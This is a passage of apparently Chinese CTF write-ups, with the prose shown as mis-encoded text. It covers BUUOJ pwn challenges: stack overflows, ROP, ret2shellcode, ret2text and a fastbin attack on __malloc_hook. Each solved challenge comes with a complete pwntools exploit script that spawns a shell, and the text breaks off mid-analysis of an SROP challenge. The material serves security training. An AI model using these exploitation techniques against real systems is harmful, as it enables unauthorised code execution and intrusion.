<p><img src="https://i.loli.net/2020/09/21/DQAdo9gNevJrtBz.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/09/21/L5gZjv1rh3bIEt7.png" alt="image.png"></p>
<p>ä¸»å‡½æ•°ä¸­ç”¨æˆ·å¯ä»¥æ§åˆ¶è¯»å…¥çš„å­—ç¬¦æ•°é‡ï¼Œå­˜åœ¨æº¢å‡º</p>
<p>åŒæ—¶å­˜åœ¨å¯ä»¥getshellçš„<code>backdoor()</code>å‡½æ•°</p>
<p><img src="https://i.loli.net/2020/09/21/GMBR1ib9dHNxlPX.png" alt="image.png"></p>
<p>æ•…è€ƒè™‘æ„é€ ropé“¾æ‰§è¡Œ<code>backdoor()</code>å‡½æ•°å³å¯</p>
<p>æ„é€ expå¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xdeadbeef</span>) + p64(<span class="number">0x4006e6</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25806</span>)<span class="comment">#p = process(&#x27;./bjdctf_2020_babystack&#x27;)</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯getshell</p>
<p><img src="https://i.loli.net/2020/09/21/nBZbpiVdHPRvu9c.png" alt="image.png"></p>
<h1 id="0x011-0x020"><a href="#0x011-0x020" class="headerlink" title="0x011 ~ 0x020"></a>0x011 ~ 0x020</h1><h2 id="0x011-babyheap-0ctf-2017-Heap-Overflow-Fastbin-Attack-one-gadget"><a href="#0x011-babyheap-0ctf-2017-Heap-Overflow-Fastbin-Attack-one-gadget" class="headerlink" title="0x011.babyheap_0ctf_2017 - Heap Overflow + Fastbin Attack + one_gadget"></a>0x011.babyheap_0ctf_2017 - Heap Overflow + Fastbin Attack + one_gadget</h2><blockquote>
<p>æ¥åˆ°BUUååšçš„ç¬¬ä¸€é“å †é¢˜</p>
</blockquote>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°<strong>ä¿  æŠ¤  å…¨  å¼€</strong>ï¼ˆ<strong>å¿ƒ è‚º åœ æ­¢</strong></p>
<p><img src="https://i.loli.net/2020/09/21/aZJExgI4UqDuPoj.png" alt="image.png"></p>
<p>æ‹–å…¥IDAé‡Œè¿›è¡Œåˆ†æï¼ˆä»¥ä¸‹éƒ¨åˆ†å‡½æ•°ã€å˜é‡åç»è¿‡é‡å‘½åï¼‰</p>
<p>å¸¸è§çš„å †é¢˜åŸºæœ¬ä¸Šéƒ½æ˜¯èœå•é¢˜ï¼Œæœ¬é¢˜ä¹Ÿä¸ä¾‹å¤–<img src="https://i.loli.net/2020/09/30/VEjFKYhibtqHfs6.png" alt="image.png"></p>
<p>æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨<code>writeHeap()</code>å‡½æ•°ä¸­å¹¶æ²¡æœ‰å¯¹æˆ‘ä»¬è¾“å…¥çš„é•¿åº¦è¿›è¡Œæ£€æŸ¥ï¼Œ<strong>å­˜åœ¨å †æº¢å‡º</strong></p>
<p><img src="https://i.loli.net/2020/09/30/WAOCpdZMVRlSxgm.png" alt="image.png"></p>
<p>æ•…æˆ‘ä»¬è€ƒè™‘å…ˆåˆ›å»ºå‡ ä¸ªå°å †å—ï¼Œå†åˆ›å»ºä¸€ä¸ªå¤§å †å—ï¼Œfreeæ‰ä¸¤ä¸ªå°å †å—è¿›å…¥åˆ°fastbinï¼Œç”¨å †æº¢å‡ºæ”¹å†™fastbinç¬¬ä¸€ä¸ªå—çš„fdæŒ‡é’ˆä¸ºæˆ‘ä»¬æ‰€ç”³è¯·çš„å¤§å †å—çš„åœ°å€ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯fastbinä¼šå¯¹chunkçš„sizeè¿›è¡Œæ£€æŸ¥ï¼Œæ•…æˆ‘ä»¬è¿˜éœ€è¦å…ˆé€šè¿‡å †æº¢å‡ºæ”¹å†™å¤§å †å—çš„sizeï¼Œä¹‹åå°†å¤§å †å—åˆ†é…å›æ¥åæˆ‘ä»¬å°±æœ‰ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªå †å—</p>
<p><img src="https://i.loli.net/2020/10/07/XARM5QmBzFadtWi.png" alt="62DB8B2E56B87418664EEB947A980782.png"></p>
<p>åˆ©ç”¨å †æº¢å‡ºå°†å¤§å †å—çš„sizeé‡æ–°æ”¹å¤§å†freeä»¥é€å…¥unsorted binï¼Œæ­¤æ—¶å¤§å †å—çš„fdä¸bkæŒ‡é’ˆæŒ‡å‘main_arena+0x58çš„ä½ç½®ï¼Œåˆ©ç”¨å¦å¤–ä¸€ä¸ªæŒ‡å‘è¯¥å¤§å †å—çš„æŒ‡é’ˆè¾“å‡ºfdçš„å†…å®¹å³å¯å¾—åˆ°main_arena+0x58çš„åœ°å€ï¼Œå°±å¯ä»¥ç®—å‡ºlibcçš„åŸºå€</p>
<p><img src="https://i.loli.net/2020/10/07/IBAZ6ChTOrQwonp.png" alt="72934A2F942430E796048F09C96A261F.png"></p>
<p>æ¥ä¸‹æ¥ä¾¿æ˜¯fastbin attackï¼šå°†æŸä¸ªå †å—é€å…¥fastbinåæ”¹å†™å…¶fdæŒ‡é’ˆä¸º__malloc_hookçš„åœ°å€ï¼ˆ__malloc_hookä½äºmain_arenaä¸Šæ–¹0x10å­—èŠ‚å¤„ï¼‰ï¼Œå†å°†è¯¥å †å—åˆ†é…å›æ¥ï¼Œæ­¤æ—¶fastbinä¸­è¯¥é“¾è¡¨ä¸Šå°±ä¼šå­˜åœ¨ä¸€ä¸ªæˆ‘ä»¬æ‰€ä¼ªé€ çš„ä½äº__malloc_hookä¸Šçš„å †å—ï¼Œç”³è¯·è¿™ä¸ªå †å—åæˆ‘ä»¬ä¾¿å¯ä»¥æ”¹å†™malloc_hookä¸Šçš„å†…å®¹ä¸ºåé—¨å‡½æ•°åœ°å€ï¼Œæœ€åéšä¾¿åˆ†é…ä¸€ä¸ªå †å—ä¾¿å¯getshell</p>
<p>è€ƒè™‘åˆ°é¢˜ç›®ä¸­å¹¶ä¸å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„åé—¨å‡½æ•°ï¼Œæ•…è€ƒè™‘ä½¿ç”¨one_gadgetä»¥getshell</p>
<p><img src="https://i.loli.net/2020/10/07/glLRkSdY3GufeOv.png" alt="D2D612904D8AB28F1DCCE651D4B81508.png"></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯fastbinå­˜åœ¨sizeæ£€æŸ¥ï¼Œæ•…åœ¨è¿™é‡Œæˆ‘ä»¬é€‰æ‹©åœ¨__malloc_hook - 0x23çš„ä½ç½®æ„é€ fake chunkï¼ˆsizeå­—æ®µä¸º0x7fåˆšå¥½èƒ½å¤Ÿé€šè¿‡malloc(0x60)çš„sizeæ£€æŸ¥ï¼‰</p>
<p>æ„é€ payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27143</span>)<span class="comment">#process(&#x27;./babyheap_0ctf_2017&#x27;)#</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index:<span class="built_in">int</span>,content</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: \n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line">    </span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#idx1</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment">#idx2</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1, the former idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2, the former idx4</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx5, prevent the top chunk combine it</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into unsorted bin, fd points to the main_arena</span></span><br><span class="line"></span><br><span class="line">main_arena = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x58</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into fastbin</span></span><br><span class="line">payload = p64(malloc_hook - <span class="number">0x23</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload) <span class="comment">#overwrite fd to fake chunk addr</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx6, our fake chunk</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x13</span> + p64(one_gadget)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œè„šæœ¬å³å¯get shell</p>
<p><img src="https://i.loli.net/2020/10/07/9n7EyWL5OC3aIcm.png" alt="image.png"></p>
<blockquote>
<p>fastbin attackä¸­åˆ†é…åˆ°__malloc_hooké™„è¿‘çš„fake chunké€šå¸¸éƒ½æ˜¯malloc(0x60)ï¼Œä¹Ÿå°±æ˜¯size &#x3D;&#x3D; 0x71ï¼Œè¿™æ˜¯å› ä¸ºåœ¨__malloc_hook - 0x23è¿™ä¸ªåœ°å€ä¸Šfake chunkçš„SIZEçš„ä½ç½®åˆšå¥½æ˜¯0x<code>7f</code>ï¼Œæ»¡è¶³äº†ç»•è¿‡fastbinçš„sizeæ£€æŸ¥çš„è¦æ±‚</p>
<p><img src="https://i.loli.net/2020/12/03/GBrOqIdPnDluXhb.png" alt="image.png"></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯åœ¨libc2.31ç‰ˆæœ¬ä¸­è¿™ä¸ªä½ç½®ä¸Šçš„æ•°æ®å·²ç»ä¸å†æ˜¯0x7fï¼Œæ•…æˆ‘ä»¬éœ€è¦<code>å…·ä½“é—®é¢˜å…·ä½“åˆ†æ,å…·ä½“ç‰ˆæœ¬å…·ä½“è°ƒè¯•</code></p>
<p><img src="https://i.loli.net/2021/02/09/uqTerVoWkSvXM3E.png"></p>
</blockquote>
<h2 id="0x012-ciscn-2019-n-5-ret2shellcode"><a href="#0x012-ciscn-2019-n-5-ret2shellcode" class="headerlink" title="0x012.ciscn_2019_n_5 - ret2shellcode"></a>0x012.ciscn_2019_n_5 - ret2shellcode</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°è¿‘ä¹ä¿æŠ¤å…¨å…³ï¼Œæ•´æŒºå¥½</p>
<p><img src="https://i.loli.net/2020/10/09/6YLBG8h3kfrqEFl.png" alt="9FIY_KOU2UD64__0RB5U66B.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>![41L&#96;5F__UIYNB_H_YE_DEHD.png](<a target="_blank" rel="noopener" href="https://i.loli.net/2020/10/09/zTYkWulo1hyLKvB.png">https://i.loli.net/2020/10/09/zTYkWulo1hyLKvB.png</a>)</p>
<p>ä¸€å¼€å§‹å…ˆå‘bssæ®µä¸Šçš„<code>name</code>è¯»å…¥æœ€å¤§<code>0x64</code>å­—èŠ‚çš„å†…å®¹ï¼Œä¹‹åå†ä½¿ç”¨<code>gets()</code>è¯»å…¥åˆ°textä¸Šï¼Œå­˜åœ¨æ ˆæº¢å‡º</p>
<p>æ•…è€ƒè™‘å…ˆå‘<code>name</code>ä¸Šå†™å…¥shellcodeå†æ§åˆ¶ç¨‹åºè·³è½¬è‡³<code>name</code>å³å¯</p>
<p>bssæ®µä¸Š<code>name</code>çš„åœ°å€ä¸º<code>0x601080</code></p>
<p><img src="https://i.loli.net/2020/10/09/Il3iOrAao5phSXm.png" alt="3N50O64P@_TF@5SAT_@__KU.png"></p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x601080</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0xdeadbeef</span>) + p64(bss_addr)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_n_5&#x27;</span>)<span class="comment">#remote(&#x27;node3.buuoj.cn&#x27;,27296)</span></span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œï¼ŒæˆåŠŸgetshell</p>
<p><img src="https://i.loli.net/2020/10/09/kxmOadD1Py7GYLM.png" alt="ZGX5RGFHA_NTT96WDXA__4T.png"></p>
<h2 id="0x013-level2-x64-ret2csu"><a href="#0x013-level2-x64-ret2csu" class="headerlink" title="0x013.level2_x64 - ret2csu"></a>0x013.level2_x64 - ret2csu</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†NXä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/10/09/wMdhOJgrpDZCicA.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/10/09/cusBMX2AOeT7yEt.png" alt="image.png"></p>
<p>åœ¨<code>vulnerable_function()</code>å¤„å­˜åœ¨æ ˆæº¢å‡ºï¼Œä¸”å­˜åœ¨<code>system()</code>å‡½æ•°</p>
<p><img src="https://i.loli.net/2020/10/09/hGbO9NaLnkory3I.png" alt="image.png"></p>
<p>åœ¨.dataæ®µå­˜åœ¨<code>&quot;/bin/sh&quot;</code>å­—ç¬¦ä¸²</p>
<p>æ•…è€ƒè™‘æ„é€ ropé“¾æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯getshell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x600A90</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006B3</span></span><br><span class="line">call_sys = <span class="number">0x400603</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x80</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(call_sys)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level2_x64&#x27;</span>)<span class="comment">#remote(&#x27;node3.buuoj.cn&#x27;,26289)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œè„šæœ¬å³å¾—flag</p>
<p><img src="https://i.loli.net/2020/10/09/85mfFgLiZVYXeuN.png" alt="image.png"></p>
<h2 id="0x014-ciscn-2019-ne-5-ret2text"><a href="#0x014-ciscn-2019-ne-5-ret2text" class="headerlink" title="0x014.ciscn_2019_ne_5 - ret2text"></a>0x014.ciscn_2019_ne_5 - ret2text</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†NXä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/10/09/5Z3rzc8pPb61hjL.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/10/09/aqwxIRMizvbVkPF.png" alt="ZX9_6BVAK5A_V_BL__V_I0X.png"></p>
<p>çœ‹èµ·æ¥é•¿å¾—åƒå †é¢˜ä½†å…¶å®å®Œå…¨æ²¡æœ‰å †çš„æ“ä½œï¼Œè¿˜æ˜¯ä¼ ç»Ÿçš„æ ˆé¢˜</p>
<p>åœ¨<code>AddLog()</code>å‡½æ•°ä¸­è¯»å…¥æœ€å¤§128å­—èŠ‚åˆ°å­—ç¬¦ä¸²<code>src</code>ä¸­</p>
<p>![UXHLHKU0D9MFLEY3MJK_&#96;QT.png](<a target="_blank" rel="noopener" href="https://i.loli.net/2020/10/09/TREtZOFSvhdqVup.png">https://i.loli.net/2020/10/09/TREtZOFSvhdqVup.png</a>)</p>
<p>åœ¨<code>GetFlag()</code>å‡½æ•°ä¸­ä¼šæ‹·è´<code>src</code>åˆ°<code>dest</code>ä¸Šï¼Œå­˜åœ¨æ ˆæº¢å‡º</p>
<p><img src="https://i.loli.net/2020/10/09/FHvp3yewxTmkG6Z.png" alt="_@SVK_64XY_UGE02KN_Q6_9.png"></p>
<p>åŒæ—¶ç¨‹åºä¸­å­˜åœ¨<code>system()</code>å‡½æ•°ä¸<code>sh</code>å­—ç¬¦ä¸²</p>
<p><img src="https://i.loli.net/2020/10/09/q8KI9ocLn1NybWz.png" alt="image.png"></p>
<p>![X0WS9USGGKI&#96;WCZK0_J80_7.png](<a target="_blank" rel="noopener" href="https://i.loli.net/2020/10/09/a7OuQVLPsSAMd85.png">https://i.loli.net/2020/10/09/a7OuQVLPsSAMd85.png</a>)</p>
<p>æ•…ç›´æ¥æº¢å‡ºæ§åˆ¶ç¨‹åºæ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x80482ea</span></span><br><span class="line">call_sys = <span class="number">0x80486b9</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x48</span> + p32(<span class="number">0xdeadbeef</span>) + p32(call_sys)  + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_ne_5&#x27;</span>)<span class="comment">#remote(&#x27;node3.buuoj.cn&#x27;,26005)</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;administrator&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯getshell</p>
<p>![L_YGD&#96;OM1C_L_RJ~7__23SD.png](<a target="_blank" rel="noopener" href="https://i.loli.net/2020/10/09/TUIEloeFPhfsXqC.png">https://i.loli.net/2020/10/09/TUIEloeFPhfsXqC.png</a>)</p>
<h2 id="0x015-ciscn-2019-s-3-ret2csu-SROP"><a href="#0x015-ciscn-2019-s-3-ret2csu-SROP" class="headerlink" title="0x015.ciscn_2019_s_3 - ret2csu || SROP"></a>0x015.ciscn_2019_s_3 - ret2csu || SROP</h2><blockquote>
<p> åº”<a target="_blank" rel="noopener" href="https://ll1ng.github.io/">æŸä½å¯çˆ±çš„å¥³å¸ˆå‚…</a>çš„è¦æ±‚å…ˆæ¥åšè¿™é“é¢˜ï¼ˆï¼ˆï¼ˆ</p>
</blockquote>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/09/13/ip9xYzyfsF8eSvU.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼š<br><img src="https://i.loli.net/2020/09/13/QX6bdK57hjWCyrG.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/09/13/5RsPUNZAyV2ot7f.png" alt="image.png"></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>main()</code>å‡½æ•°ä¼šè°ƒç”¨<code>vuln()</code>å‡½æ•°ï¼Œåœ¨<code>vuln()</code>å‡½æ•°ä¸­ä¼šè°ƒç”¨ä¸¤ä¸ª<strong>ç³»ç»Ÿè°ƒç”¨</strong>â€”â€”0å·ç³»ç»Ÿè°ƒç”¨<code>sys_read</code>è¯»å…¥æœ€å¤§<strong>0x400</strong>ä¸ªå­—èŠ‚åˆ°bufä¸Šï¼Œbufåªåˆ†é…åˆ°äº†<strong>0x10</strong>ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼Œå­˜åœ¨æ ˆæº¢å‡ºï¼›éšåè°ƒç”¨1å·ç³»ç»Ÿè°ƒç”¨<code>sys_write</code>è¾“å‡ºbufä¸Šçš„<strong>0x30</strong>å­—èŠ‚çš„å†…å®¹</p>
<p>åŒæ—¶æˆ‘ä»¬è¿˜å¯ä»¥è§‚å¯Ÿåˆ°æœ‰ä¸€ä¸ªæ²¡æœ‰è¢«ç”¨åˆ°çš„<code>gadget()</code>å‡½æ•°ï¼Œé‡Œé¢æœ‰ä¸¤æ¡gadget<strong>å°†raxè®¾ä¸º0xfæˆ–0x3b</strong>ï¼Œä¹Ÿå°±æ˜¯15æˆ–59</p>
<p><img src="https://i.loli.net/2020/09/13/eBiLZDC9uwRxvIP.png" alt="image.png"></p>
<p>è€Œ<code>syscall</code>æŒ‡ä»¤ä»<strong>raxå¯„å­˜å™¨</strong>ä¸­è¯»å–å€¼å¹¶è°ƒç”¨ç›¸å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆä»ç¨‹åºæœ¬èº«çš„ä»£ç æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹å‡ºè¿™ä¸€ç‚¹ï¼‰ï¼Œå¯¹åº”çš„æˆ‘ä»¬å¯ä»¥æƒ³åˆ°çš„æ˜¯è¿™ä¸ªgadgetè¦æˆ‘ä»¬é€šè¿‡ç›¸åº”çš„<strong>ç³»ç»Ÿè°ƒç”¨</strong>æ¥getshell</p>
<p>åœ¨64ä½Linuxä¸‹ï¼Œ15å·ç³»ç»Ÿè°ƒç”¨æ˜¯<strong>rt_sigreturn</strong>ï¼Œè€Œ59å·ç³»ç»Ÿè°ƒç”¨åˆ™æ˜¯æˆ‘ä»¬æ‰€ç†Ÿæ‚‰çš„<strong>execve</strong>ï¼Œ<del>é‚£ä¹ˆè¿™ä¸ªç³»ç»Ÿè°ƒç”¨è¯¥æ€ä¹ˆåˆ©ç”¨å‘¢æˆ‘æš‚ä¸”è’™åœ¨å¤é‡Œ</del></p>
<blockquote>
<p>ç³»ç»Ÿè°ƒç”¨ä¸€è§ˆè¡¨è§<a target="_blank" rel="noopener" href="https://archive.next.arttnba3.cn/2000/10/12/%E3%80%90%E8%B5%84%E6%96%99%E5%AD%98%E6%A1%A3-0x01%E3%80%91Linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%80%E8%A7%88-by-arttnba3/">è¿™é‡Œ</a></p>
</blockquote>
